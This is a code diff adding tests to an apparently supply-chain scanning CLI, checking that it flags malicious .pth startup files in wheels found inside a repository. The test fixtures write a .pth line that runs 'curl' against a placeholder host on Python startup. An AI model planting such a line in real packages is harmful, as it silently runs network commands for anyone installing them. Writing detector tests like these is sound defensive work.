@@ -496,6 +496,65 @@ wheels = [
     assert any(finding["signal_type"] == "python-startup-pth-exec" for finding in data["findings"])
 
 
+def _write_local_wheel_lock(repo, artifact) -> None:
+    (repo / "fyn.lock").write_text(
+        f"""
+version = 1
+
+[[package]]
+name = "demo"
+version = "0.1.0"
+source = {{ editable = "." }}
+dependencies = [{{ name = "badlib" }}]
+
+[[package]]
+name = "badlib"
+version = "1.0.0"
+source = {{ registry = "https://pypi.org/simple" }}
+wheels = [
+  {{ url = "{artifact.as_uri()}", hash = "sha256:{_sha256(artifact)}", size = 42 }},
+]
+"""
+    )
+
+
+def test_vet_cli_scan_artifacts_reads_local_artifacts_inside_repo_by_default(tmp_path):
+    repo = tmp_path / "repo"
+    (repo / "vendor").mkdir(parents=True)
+    artifact = repo / "vendor" / "badlib-1.0.0-py3-none-any.whl"
+    with zipfile.ZipFile(artifact, "w") as zf:
+        zf.writestr("badlib.pth", "import os; os.system('curl https://example.invalid/p')\n")
+    _write_local_wheel_lock(repo, artifact)
+
+    result = CliRunner().invoke(
+        main, ["vet", "--repo", str(repo), "-f", "json", "--scan-artifacts"]
+    )
+
+    data = json.loads(result.output)
+    assert data["summary"]["artifact_scans"] == 1
+    assert any(finding["signal_type"] == "python-startup-pth-exec" for finding in data["findings"])
+
+
+def test_vet_cli_scan_artifacts_does_not_read_local_artifacts_outside_repo(tmp_path):
+    artifact = tmp_path / "badlib-1.0.0-py3-none-any.whl"
+    with zipfile.ZipFile(artifact, "w") as zf:
+        zf.writestr("badlib.pth", "import os; os.system('curl https://example.invalid/p')\n")
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    _write_local_wheel_lock(repo, artifact)
+
+    result = CliRunner().invoke(
+        main, ["vet", "--repo", str(repo), "-f", "json", "--scan-artifacts"]
+    )
+
+    data = json.loads(result.output)
+    assert data["summary"]["artifact_scans"] == 0
+    assert any(finding["signal_type"] == "artifact_untrusted_url" for finding in data["findings"])
+    assert not any(
+        finding["signal_type"] == "python-startup-pth-exec" for finding in data["findings"]
+    )
+
+
 def _sha256(path) -> str:
     digest = hashlib.sha256()
     with path.open("rb") as f:
